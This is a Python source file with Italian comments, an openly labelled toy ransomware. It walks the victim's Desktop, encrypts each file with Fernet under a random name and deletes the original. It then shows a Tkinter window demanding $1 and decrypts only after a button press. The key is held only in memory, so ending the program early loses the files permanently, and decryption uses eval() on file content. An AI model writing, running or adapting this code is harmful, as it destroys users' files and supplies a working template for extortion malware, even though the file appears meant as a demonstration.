import os
import pathlib
import string
import random
from cryptography.fernet import Fernet
import tkinter as tk

# funzione per la generazione di nomi casuali

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

# stabilisco la chiave crittografica
    
key = Fernet(Fernet.generate_key())

# prendo lo username della vittima
username = os.getlogin()

# voglio crittografare i file sul desktop
desktop = pathlib.Path(f"C:\\Users\{username}\Desktop")
files = list(desktop.rglob("*"))

# mi ricordo quali file ho crittografato
encrypted_files = []

# encrypt
for file in files:
    if not os.path.isdir(file) and not str(file).split("\\")[-1] == "malware.exe": # prendo solo i file (non malware.exe)
        fn = str(file).split("\\")[-1] # prendo il nome del file con l'estensione
        file_name, file_extension = fn.split(".")  # separo nome ed estensione
        name = get_random_string(random.randint(10,20)) # genero un nome casuale per il file crittografato
        with open(file,"rb") as f:
            with open(f"{name}.{file_extension}","wb") as n:
                plainpack= str([f.read(),file_name]).encode() # trascrivo il file originale e lo impacchetto col nome originale
                n.write(key.encrypt(plainpack)) # lo cifro
        encrypted_files.append(f"{name}.{file_extension}") # lo aggiungo ai file crittografati
        os.remove(file) # lo rimuovo dal desktop

# finestra per la richiesta di riscatto
win = tk.Tk()
win.geometry("400x150")
win.title("This is a very dangerous ransomware")
w = tk.Label(win, text ="Ah-ha! Your files have been encrypted. Give me 1$ to decrypt 'em!",font=("Calibri",14,"bold"),wraplength=300)
w.pack()
def close():
    win.quit()
tk.Button(win, text= "SEND 1$", font=("Calibri",14,"bold"), command=close).pack(pady=20)
win.mainloop()

# dopo aver pagato 1$ i file vengono ripristinati

for file in encrypted_files:
    with open(file,"rb") as f: 
        _, file_extension = str(file).split(".")  # leggo il nome del file con la sua estensione
        cipherfile = f.read() # leggo il contenuto cifrato
        plainbytes, file_name = eval(key.decrypt(cipherfile).decode()) # lo decifro e prendo sia il plaintext che il nome originale
        try:
            with open(f'{file_name}.{file_extension}',"wb") as n: # ripristino il file
                n.write(plainbytes)
        except Exception:
            continue
    os.remove(file) # rimuovo il file crittografato
        
        
        
    
    




